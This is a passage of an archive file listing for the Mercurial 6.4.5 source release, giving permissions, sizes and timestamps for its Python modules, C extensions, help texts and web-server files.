--rw-r--r--   0 alphare   (1000) alphare   (1000)        8 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/py.typed
--rw-r--r--   0 alphare   (1000) alphare   (1000)    86522 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/revlog.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      392 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/revlog.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2804 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/util.h
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/cffi/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2431 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/bdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      717 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/bdiffbuild.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1497 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/mpatch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1017 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/mpatchbuild.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3864 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/osutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2469 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cffi/osutilbuild.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    80539 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/changegroup.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20180 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/changelog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26160 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/chgserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   139581 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cmdutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18319 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/color.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   266781 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/commands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24092 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/commandserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18666 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/commit.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1030 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/compat.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8656 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/config.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    54110 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/configitems.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   103075 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/context.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    46956 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/copies.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    72638 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/crecord.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40425 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dagop.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15445 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dagparser.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   156318 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/debugcommands.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/defaultrc/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/defaultrc/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7436 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/defaultrc/mergetools.rc
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17445 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/destutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2300 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/diffhelper.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5099 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/diffutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    64251 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29096 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstatemap.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/dirstateutils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstateutils/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2270 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstateutils/docket.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3926 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstateutils/timestamp.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15148 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dirstateutils/v2.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22406 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/discovery.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    46895 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dispatch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2246 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/dummycert.pem
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22710 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/encoding.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18449 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/error.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    97822 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/exchange.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4310 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/exewrapper.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31766 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/extensions.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12044 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/exthelper.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11528 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/fancyopts.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9227 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/filelog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43641 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/filemerge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18948 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/fileset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10550 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/filesetlang.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26818 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/formatter.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17075 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/graphmod.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7283 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/grep.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11460 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hbisect.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    39685 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/help.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/helptext/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3796 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/bundlespec.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4608 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/color.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      240 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/common.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)   127093 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/config.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1275 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/dates.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      678 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/deprecated.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1358 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/diffs.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4385 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/environment.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2149 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/evolution.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1251 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/extensions.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2119 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/filesets.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3005 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/flags.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15214 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/glossary.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1856 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hg-ssh.8.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3200 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hg.1.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      723 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hgignore.5.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3418 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hgignore.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hgrc.5.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3366 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/hgweb.txt
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/helptext/internals/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5459 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/bid-merge.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19670 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/bundle2.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3270 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/bundles.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3928 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/cbor.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1279 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/censor.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10485 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/changegroups.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3187 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/config.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24408 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/dirstate-v2.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13612 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/extensions.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11384 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/linelog.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2588 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/mergestate.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5895 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/requirements.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11319 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/revlogs.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42319 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/wireprotocol.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29462 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/wireprotocolrpc.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24727 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/internals/wireprotocolv2.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4513 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/merge-tools.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1467 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/pager.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3815 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/patterns.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3044 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/phases.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6980 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/revisions.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3178 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/rust.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8184 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/scripting.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7386 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/subrepos.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5975 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/templates.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2531 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/helptext/urls.txt
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55483 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hg.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/hgweb/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3296 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9068 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/common.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18182 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/hgweb_mod.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20376 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/hgwebdir_mod.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22682 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/request.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13114 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/server.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    47598 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/webcommands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27561 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/webutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3003 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/wsgicgi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7020 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hgweb/wsgiheaders.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11926 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/hook.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4310 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/httpconnection.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20937 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/httppeer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4080 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/i18n.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/interfaces/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/interfaces/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6642 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/interfaces/dirstate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    66444 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/interfaces/repository.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1009 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/interfaces/util.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27889 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/keepalive.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15185 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/linelog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   147522 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/localrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12020 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/lock.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    43811 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/logcmdutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5026 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/logexchange.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3936 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/loggingutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4134 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/lsprof.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2757 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/lsprofcalltree.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17155 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mail.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    77108 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/manifest.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    53506 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/match.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17881 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    92844 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/merge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31883 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mergestate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      463 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mergeutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33038 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/metadata.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3581 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/minifileset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29765 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/minirst.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8398 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mpatch.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      713 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/mpatch.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8293 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/namespaces.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12789 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/narrowspec.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1799 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/node.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    37622 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/obsolete.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36632 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/obsutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26220 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/parser.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   104081 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/patch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12816 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pathutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33272 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/phases.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4716 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/policy.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24699 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/posix.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8772 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/profiling.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10401 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/progress.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/pure/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2028 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/base85.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2643 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/bdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2285 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/charencode.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3592 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/mpatch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6042 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/osutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32278 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pure/parsers.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1669 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pushkey.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6075 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pvec.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13845 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pycompat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6667 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/pythoncapi_compat.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3620 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/rcutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18156 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/registrar.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18357 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/repair.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4547 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/repocache.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17211 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/repoview.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4888 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/requirements.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   124815 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlog.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/revlogutils/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2303 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1495 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/concurrency_checker.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9965 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/constants.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21533 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/debug.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    57617 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/deltas.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14441 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/docket.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7467 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/flagutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21951 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/nodemap.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5433 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/randomaccessfile.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3642 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/revlogv0.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29504 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/rewrite.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6264 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revlogutils/sidedata.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    90863 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29091 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/revsetlang.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8708 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/rewriteutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2740 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/scmposix.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    77872 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/scmutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3565 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/scmwindows.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7167 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/server.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18630 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/setdiscovery.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40881 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/shelve.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3998 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/similar.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17294 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/simplemerge.py
